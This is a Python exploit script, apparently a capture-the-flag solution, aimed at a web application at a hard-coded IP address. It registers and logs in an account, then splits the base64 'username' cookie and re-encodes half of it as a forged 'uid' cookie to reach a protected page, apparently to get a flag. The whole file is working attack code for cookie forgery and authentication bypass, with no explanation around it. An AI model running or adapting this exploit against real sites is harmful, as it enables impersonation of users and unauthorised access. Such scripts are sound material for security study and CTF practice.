import requests
import base64
import urllib
import os
import random
from bs4 import BeautifulSoup 
host="http://101.71.29.6:10000"
urls={
    "reg":"{host}/index.php?action=view&mod=register",
    "regsubmit":"{host}/index.php?action=action&mod=register",
    "login":"{host}/index.php?action=action&mod=login",
    "index":"{host}/action=view&mod=index",
    "captcha":"{host}/index.php?action=view&mod=captcha"
}
for u in urls:
    urls[u]=urls[u].format(host=host)
def showcaptcha(s):
    captcha_img=s.get(url=urls['captcha'])
    fileDir='captcha.png'
    with open(fileDir,'wb') as f:
        f.write(captcha_img.content)
    os.startfile(fileDir)
def exploit(index):
    session=requests.session()
    initSession=session.get(url=urls['reg'])
    soup = BeautifulSoup(initSession.text,'html.parser')
    token=soup.select('#token')[0].text
    showcaptcha(session)
    cur_cha=input('input captcha')
    reg_data = {
        "username":f"aaaaaaserfend{random.randint(100,999)}{index}", 
        "password":"123",
        "password2":"123",
        "token":token,
        "captcha":cur_cha
    }
    re = session.post(url=urls['regsubmit'], data=reg_data)
    print(re.text)
    showcaptcha(session)
    reg_data['captcha']=input('input captcha')
    re = session.post(url=urls['login'],data=reg_data)
    re = session.get(url=urls['index'])
    name_cookie=session.cookies['username']
    name_hex = base64.b64decode(urllib.parse.unquote(name_cookie))
    name_hex_half=name_hex[len(name_hex)//2:]
    name_b64=base64.b64encode(name_hex_half)
    uid = urllib.parse.quote(name_b64)
                                        
    flag_cookie={
        "uid":uid, 
        "username": name_cookie
    }

    re = requests.get(url=urls['index'], cookies=flag_cookie)
    return re.text

# for i in range(9):
#     print(f"exploit({i}):{exploit(i)}")
print(exploit(6))